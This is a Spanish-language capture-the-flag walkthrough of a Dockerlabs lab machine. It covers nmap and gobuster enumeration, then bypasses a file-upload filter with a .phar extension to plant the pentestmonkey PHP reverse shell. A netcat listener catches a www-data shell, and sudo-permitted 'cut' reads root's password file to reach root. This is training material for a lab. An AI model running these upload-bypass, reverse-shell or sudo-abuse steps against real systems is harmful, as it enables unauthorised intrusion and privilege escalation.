# Dockerlabs
![dockerlabs](https://github.com/TBrux/DOCKERLABS/assets/168732212/2763751a-27cd-400b-af47-ce08eac22341)

## Reconocimiento y Enumeración.

Comprobar que la máquina está en marcha.

```bash
❯ ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.036 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.036/0.036/0.036/0.000 ms

```

Una vez nos responde ping y ya podemos empezar enumerando la máquina. El ttl=64 nos puede indicar que sea una máquina **Linux**.

Lanzamos nmap para ver que puertos nos encuentra.

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn -oG allPorts 172.17.0.2
```
```
- `-sS`: Realiza un escaneo SYN.
- `-p-`: Escanea todos los puertos.
- `--open`: Muestra solo los puertos abiertos.
- `--min-rate 5000`: Establece la velocidad mínima de envío de paquetes a 5000 por segundo.
- `-vvv`: Genera una salida muy detallada y verbosa.
- `-n`: Evita la resolución de DNS inversa.
- `-Pn`: Omite la detección de hosts.
- `-oG allPorts`: Guarda los resultados en un archivo llamado "allPorts".
- `172.17.0.2`: La dirección IP del host objetivo.
```
```
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
```
Como tenemos abierto el puerto 80, vamos a comprobar la versión y lanzar unos scripts básicos para ver que información obtenemos.

```bash
nmap -sCV -p80 -vvv -oN versionPorts 172.17.0.2
```
```
- `-sCV`: Escaneo de versiones y vulnerabilidades.
- `-p80`: Escaneo de los puertos.
- `-vvv`: Salida muy detallada y verbosa.
- `-oN versionPorts`: Guarda los resultados en "versionPorts".
- `172.17.0.2`: Dirección IP del host escaneado.
```
```
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Dockerlabs
```
Utilizamos **gobuster** para hacer fuzzing y ver si encontramos algo que nos pueda ser útil.
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```
```
❯ gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/index.php            (Status: 200) [Size: 8235]
/uploads              (Status: 301) [Size: 310] [--> http://172.17.0.2/uploads/]
/upload.php           (Status: 200) [Size: 0]
/machine.php          (Status: 200) [Size: 1361]
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

## Explotación.

En la página principal no encontramos nada relevante, pero si vemos que hemos encontrado un página **machine.php** que es interesante.
![uploadfile](https://github.com/TBrux/DOCKERLABS/assets/168732212/ff1b1175-d44c-4f6b-a996-333b763e137c)

Intentamos subir un archivo **.php** pero está restingido a solo archivos **.zip**.
Si buscamos en [HackTricks](https://book.hacktricks.xyz/pentesting-web/file-upload), encontramos diferentes extensiones para hacer un **bypass** y poder ejecutar código php.
```
    PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module
```
En este caso, la extensión que nos va a funcionar es **.phar**, así que subiremos una reverse shell en un archivo php, en mi caso he utilizado este de [GITHUB](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) de pentestmonkey.

![reverseshell](https://github.com/TBrux/DOCKERLABS/assets/168732212/479d4098-eee7-493f-813d-68433fa2ebde)

Una vez subido, cuando hemos hecho fuzzing hemos encontrado un directorio llamado **/uploads**, vamos a ese directorio desde el navegador y ahí tenemos nuestra revershell subida.

![uploads](https://github.com/TBrux/DOCKERLABS/assets/168732212/8b7728a5-9405-4a06-b8e4-cb63c4cdb44f)

Ahora nos ponemos en escucha en el puerto configurado en nuestro archivo php y lo ejecutamos.
```
❯ nc -lvnp 4443
listening on [any] 4443 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 38426
Linux fce2bf34762f 6.6.9-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.6.9-1kali1 (2024-01-08) x86_64 x86_64 x86_64 GNU/Linux
 12:49:50 up  2:01,  0 user,  load average: 0.02, 0.28, 0.65
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```
Hacemos un tratamiento de la tty.
```bash
script /dev/null -c bash
```
CTRL + Z
```bash
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

## Escalada de privilegios.
En la escalada de privilegios buscamos archivos que podamos utilizar con privilegios de root u otro usuario con más privilegios.
```
www-data@fce2bf34762f:/$ sudo -l
Matching Defaults entries for www-data on fce2bf34762f:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User www-data may run the following commands on fce2bf34762f:
    (root) NOPASSWD: /usr/bin/cut
    (root) NOPASSWD: /usr/bin/grep
www-data@fce2bf34762f:/$
```
En este caso vamo a utilizar **/usr/bin/cut**, si vamos a [GTFOBins](https://gtfobins.github.io/gtfobins/cut/), podemos ver como utilizar este binario para leer un archivo txt que encontramos en el directorio **/opt**.
```
www-data@fce2bf34762f:/$ cd /opt
www-data@fce2bf34762f:/opt$ sudo /usr/bin/cut -d "" -f1 "/root/clave.txt"
dockerlabsmolamogollon123
www-data@fce2bf34762f:/opt$ 
```
Ahora como parece que tenemos la clave de **root**, probamos a cambiar al usuario **root** y lo tenemos.
```bash
su root
```
```
www-data@fce2bf34762f:/opt$ su root
Password: 
root@fce2bf34762f:/opt# whoami
root
root@fce2bf34762f:/opt#
```

